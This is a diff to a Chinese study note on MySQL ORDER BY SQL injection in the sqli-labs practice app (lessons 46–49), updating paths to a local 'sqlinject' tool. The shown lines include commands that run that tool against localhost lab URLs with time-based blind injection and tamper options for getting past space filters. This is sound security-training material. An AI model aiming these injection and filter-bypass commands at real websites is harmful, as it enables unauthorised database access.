@@ -4,7 +4,7 @@
 >
 > 总目录：[[../SQL总目录|SQL 总目录]] · 本目录 [[mysql结构总目录|mysql结构 总目录]]
 >
-> 工具箱：[[../../../../../hackingtools/web/README|hackingtools/web 工具箱]]
+> 工具箱：`~/hackingtools/web/injection/sqlinject`（工具库位于仓库外 `/home/a/hackingtools`）
 >
 > sqli-labs 对照：less-46、less-47（报错）、less-48、less-49（盲注变体）
 
@@ -359,20 +359,20 @@ $sql = "SELECT * FROM users ORDER BY $order";  // 此时拼接是安全的
 
 ## 十、自动化：sqlinject.py 工具
 
-本章对应命令已内置在工具中，路径 `~/hackingtools/web/injection/sqlinject.py`（用法详见 [[../../../../../hackingtools/web/README|hackingtools/web 工具箱]]）：
+本章对应命令已内置在工具中，路径 `~/hackingtools/web/injection/sqlinject`（用法详见 `~/hackingtools/web/injection/sqlinject`（工具库位于仓库外 `/home/a/hackingtools`））：
 
 ```bash
 # ORDER BY 位报错路线：工具识别参数位于关键字位置后自动切换无 union 流程
-python3 ~/hackingtools/web/injection/sqlinject.py \
+python3 ~/hackingtools/web/injection/sqlinject \
   -u "http://127.0.0.1/sqli-labs/Less-46/?sort=1"
 
 # 无报错回显的盲注变体（less-48/49），指定时间模式与阈值
-python3 ~/hackingtools/web/injection/sqlinject.py \
+python3 ~/hackingtools/web/injection/sqlinject \
   -u "http://127.0.0.1/sqli-labs/Less-48/?sort=1" \
   --technique T --time-sec 4
 
 # 叠加过滤场景时补 tamper（如同时过滤空格）
-python3 ~/hackingtools/web/injection/sqlinject.py \
+python3 ~/hackingtools/web/injection/sqlinject \
   -u "http://127.0.0.1/sqli-labs/Less-48/?sort=1" \
   --tamper space2comment,doublewrite
 ```
